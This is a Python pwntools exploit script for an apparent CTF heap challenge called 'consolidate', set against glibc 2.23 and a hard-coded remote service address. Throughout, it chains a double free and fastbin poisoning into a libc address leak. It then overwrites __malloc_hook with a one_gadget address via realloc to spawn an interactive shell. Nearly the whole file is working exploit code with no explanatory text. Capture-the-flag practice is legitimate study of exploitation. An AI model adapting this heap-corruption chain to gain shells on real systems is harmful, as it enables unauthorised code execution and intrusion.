from pwn import *
import sys
remote_addr = ["47.106.8.27",47642]
libc = ELF('./libc-2.23.so')
#elf = ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./consolidate")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 1

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

#debug()

def menu(idx):
    sla(b'choice\n', str(idx).encode())
    
def add(content):
    menu(1)
    sa(b"content\n",content)

def delete(idx):
    menu(2)
    sla(b"idx\n",str(idx))
    
def edit(idx,content):
    menu(3)
    sla(b"idx\n",str(idx))
    sa(b"content\n",content)

def show(idx):
    menu(4)
    sla(b"idx\n",str(idx))

add(b'/bin/sh\x00') #0 
add(b'/bin/sh\x00') #1  
add(b'/bin/sh\x00') #2 
add(b'/bin/sh\x00') #3  
add(b'/bin/sh\x00') #4 

delete(0)
delete(1)
delete(0)
edit(0, b'\xa0')

add(b'/bin/sh\x00')

edit(1, p64(0) * 5 + p64(0x71))

add(b'a' * 0x38 + p64(0xe1))

delete(2)
show(2)
libc.address = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00")) - 0x68 - libc.sym[b"__malloc_hook"]
pr('libc_base', libc.address)
realloc = libc.sym[b"__libc_realloc"]
malloc_hook = libc.sym[b"__malloc_hook"]
free_hook = libc.sym[b"__free_hook"]
shell = libc.address + 0x4527a

delete(0)

edit(0,p64(malloc_hook-0x23))
add(b"/bin/sh")
add(b'a' * 0xb + p64(shell) + p64(realloc+0x10))

menu(1)

p.interactive()
